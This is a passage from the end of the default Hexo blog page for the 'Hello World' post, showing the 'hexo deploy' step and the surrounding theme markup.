<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/12/08/hello-world/" data-id="cm4fk1d3i0000bs3a4e3f4kq7" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AFpwn/">(no title)</a>
          </li>
        
          <li>
            <a href="/2024/12/08/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>